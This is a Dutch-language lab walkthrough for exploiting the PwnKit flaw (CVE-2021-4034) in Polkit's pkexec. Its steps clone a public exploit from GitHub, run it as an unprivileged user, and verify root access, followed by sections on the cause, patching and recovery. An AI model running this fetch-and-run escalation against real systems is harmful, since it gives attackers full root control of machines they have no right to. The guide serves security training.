# CVE-2021-4034 (PwnKit) Exploitatie Gids

## 🎯 Overzicht

Deze gids demonstreert hoe je CVE-2021-4034 kunt exploiteren, een lokale privilege-escalatie kwetsbaarheid in de pkexec-component van Polkit. De exploit stelt een lokale gebruiker in staat om root-rechten te verkrijgen op kwetsbare systemen.

## 📋 Vereisten

- SSH-toegang tot de kwetsbare (Ubuntu) VM als gebruiker `tester`
- Internetverbinding om GitHub te bereiken
- Basiskennis van Linux command line
- Kali Linux VM voor exploitatie

## 📝 Cheatsheet

- SSH naar de kwetsbare VM: `ssh tester@<ubuntu_ip>`
- Controleer huidige rechten: `id`
- Clone exploit en navigeer:
  ```bash
  git clone https://github.com/cd80-ctf/CVE-2021-4034.git && cd CVE-2021-4034
  ```
- Maak exploit uitvoerbaar: `chmod +x run.sh`
- Voer exploit uit: `./run.sh`
- Verifieer root-toegang: `id` of `whoami`
- Voor preventie en herstel: zie secties "Best Practices" en "Impact & Recovery"

## 🔍 Kwetsbaarheidsanalyse

### Technische Details

- **Component**: pkexec (Polkit)
- **Type Kwetsbaarheid**: Lokale Privilege Escalatie (LPE)
- **CVSS Score**: 7.8 (Hoog)
- **Oorzaak**: Out-of-bounds schrijven in argumentafhandeling

### Getroffen Systemen

- Ubuntu 18.04 (en andere Linux distributies)
- Systemen met Polkit versies voor de fix

## 🚀 Exploitatiestappen

### 1. Initiële Toegang

1. SSH naar de kwetsbare (Ubuntu) VM (vanaf de Kali Linux VM):

   ```bash
   ssh tester@<ubuntu_ip>
   ```

1.2 open de bash shell
``` bash
bash
```

2. Controleer huidige rechten:
   ```bash
   id
   # Verwacht resultaat: uid=1001(tester) gid=1001(tester) groups=1001(tester)
   ```

### 2. Exploit Setup

1. install git
```bash
sudo apt install git gcc
```

2. Clone de exploit repository:

   ```bash
   git clone https://github.com/cd80-ctf/CVE-2021-4034.git
   cd CVE-2021-4034
   ```

3. Maak de exploit uitvoerbaar:

   ```bash
   chmod +x run.sh
   ```

4. Voer de exploit uit:
   ```bash
   ./run.sh
   ```


### 3. Verificatie

1. Na succesvolle exploitatie, controleer root-toegang:

   ```bash
   id
   # Verwacht resultaat: uid=0(root) gid=0(root) groups=0(root)
   ```

2. Test root-rechten:
   ```bash
   whoami
   # Verwacht resultaat: root
   ```

## 📚 Begrip van de Exploit

### Hoe het Werkt

1. De exploit maakt gebruik van een geheugencorruptie kwetsbaarheid in pkexec
2. Het manipuleert omgevingsvariabelen om de kwetsbaarheid te triggeren
3. De exploit creëert een kwaadaardige omgeving die leidt tot root-toegang

### Technische Details

De kwetsbaarheid bestaat omdat pkexec command-line argumenten niet correct verwerkt, wat leidt tot een out-of-bounds schrijven. Dit stelt een aanvaller in staat om geheugen te manipuleren en verhoogde rechten te verkrijgen.

## 🔒 Veiligheidsimplicaties

- Elke lokale gebruiker kan root-toegang krijgen
- Geen speciale rechten vereist
- Kan worden gebruikt als onderdeel van een grotere aanvalsketen

## 📝 Best Practices

1. **Voor Systeembeheerders**

   - Houd systemen up-to-date
   - Pas beveiligingspatches direct toe
   - Overweeg gebruik van AppArmor/SELinux profielen voor pkexec

## 🔄 Impact & Recovery

- Na exploitatie kan een aanvaller volledige root-toegang verkrijgen, wat leidt tot installatie van rootkits, backdoors en volledige compromittering.
- Recovery stappen:
  1. Beëindig ongeautoriseerde sessies en wijzig alle wachtwoorden.
  4. Overweeg herinstallatie van het besturingssysteem bij vermoeden van rootkit-infectie.

## 🙏 Credits

- Originele kwetsbaarheidsontdekking: **Qualys Security**
- Exploit code: [cd80-ctf](https://github.com/cd80-ctf/CVE-2021-4034)

## ⚠️ Disclaimer

Deze gids is alleen bedoeld voor educatieve doeleinden. De exploit mag alleen worden gebruikt in gecontroleerde omgevingen met de juiste autorisatie.

